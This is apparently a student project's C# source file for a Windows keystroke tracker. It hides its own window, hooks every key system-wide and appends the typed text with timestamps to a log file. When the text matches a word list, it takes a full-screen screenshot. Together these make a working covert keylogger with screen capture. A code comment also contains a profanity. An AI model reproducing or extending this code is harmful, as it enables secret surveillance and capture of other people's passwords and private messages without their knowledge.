using System;
using System.Collections.Generic;
using System.Text;
using System.Windows;
using System.Windows.Input;
using System.Diagnostics;
using System.Threading;
//using System.Windows.Threading;
using System.Windows.Forms;
using System.IO;
using KeyTrackerBase;
using System.Drawing;

namespace KeyTrackerBase
{
    public partial class Form1 : Form
    {
        //bool keys
        bool shift = false;

        //string word = "cunt";
        string sentence;
        string badWords;
        string level;
        string[] words = File.ReadAllLines(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\words.txt");
        int countWord = 0;
        int countChar = 0;
        int countDetect = 0;

        public Form1()
        {
            //hide form
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            InitializeComponent();


            #region Keys to watch
            gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
            gkh.KeyUp += new System.Windows.Forms.KeyEventHandler(gkh_KeyUp);
            //automatically detects keys inputted for use in KeyDown event below
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                gkh.HookedKeys.Add(key);

            #endregion

        }

        //new instance of glabal key hook
        globalKeyboardHook gkh = new globalKeyboardHook();

        private void KeyPressMod(object sender, System.Windows.Forms.KeyPressEventArgs e)
        {
                
        }

        void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            RoutedEventArgs f = new RoutedEventArgs();

            //counts characters
            countChar++;

            #region Spacebar
            if (e.KeyCode == Keys.Space)
                countWord++;
            #endregion

            #region Shift - NOT WORKING (YET)
            if (e.KeyCode == Keys.LShiftKey || e.KeyCode == Keys.RShiftKey)
                shift = true;//turns shift on for next char
            #endregion

            #region Backspace
            if (e.KeyCode == Keys.Back)
            {
                if (sentence != "")
                {
                    sentence = sentence.Remove(sentence.Length - 1);
                    textBox1.Text = sentence;
                    e.Handled = false;
                }
            }
            #endregion

            #region Return
            if (e.KeyCode == Keys.Return)
            {

            }
            #endregion

            

            //MIGHT BE WORTH ADDING A VARYING TIMER TO RECORD TEXT IN THE PAST _ MINUTES
            #region New Key Logger (Main) - User

            if (e.KeyCode != Keys.Back)
            {
                sentence += ((char)e.KeyValue).ToString().ToLower();
                textBox1.Text = sentence;

                #region Word Checker

                    ////hierarchy level of words
                    //switch (level)
                    //{
                    //    case "low":

                    //        break;
                    //    case "medium":

                    //        break;
                    //    case "High":

                    //        break;
                    //    default:

                    //        break;
                    //}

                #endregion
                    if (sentence != "\r")
                    {
                        if (sentence != "¾")
                        {
                            if (countWord == 30 || countChar == 180 || e.KeyCode == Keys.OemPeriod || e.KeyCode == Keys.Return)
                            {
                                if (sentence != "")
                                {
                                    using (StreamWriter file = new StreamWriter(@"C:\\Users\\Jon\\Desktop\\GroupProjectUpdated\\KeyTrackerBase\\log.txt", true))
                                    {
                                        if (e.KeyCode != Keys.OemPeriod)
                                        {
                                            //writes entries to txt file - logger
                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence);
                                            //word detection - NOT WORKING
                                            for (int i = 0; i < words.Length; i++)
                                            {
                                                if (sentence.Contains(words[i]))
                                                {
                                                    countDetect++;
                                                    badWords += words[i] + " ";

                                                    //capture screenshot
                                                    //http://www.mindfiresolutions.com/How-to-take-screenshot-programmatically-and-mail-it-in-C-647.php
                                                    Bitmap screencapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                                                    Graphics graphics = Graphics.FromImage(screencapture as Image);
                                                    graphics.CopyFromScreen(0, 0, 0, 0, screencapture.Size);
                                                    screencapture.Save("C:\\Users\\Jon\\Desktop\\screenshot.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                }
                                                
                                            }
                                            file.WriteLine("Amount of Words Detected: " + countDetect + " - Words: " + badWords);
                                            
                                        }
                                        else
                                            //writes entries to txt file, removes period symbol and puts fullstop - logger
                                            file.WriteLine(DateTime.Now.ToString() + ":  " + sentence.Remove(sentence.Length - 1) + ".");

                                        //string and ints reset
                                        sentence = "";
                                        countWord = 0;
                                        countChar = 0;
                                        countDetect = 0;
                                        badWords = "";
                                        file.Close();
                                    }
                                }
                            }
                        }
                        else
                            sentence = "";
                    }
                    else
                        sentence = "";
            }

            #endregion

            

            

        }


        void gkh_KeyUp(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            //Put keyup events in here (if necessary)
        }

        public void Form1_Load(object sender, EventArgs e)
        {
            
        }

    }
}
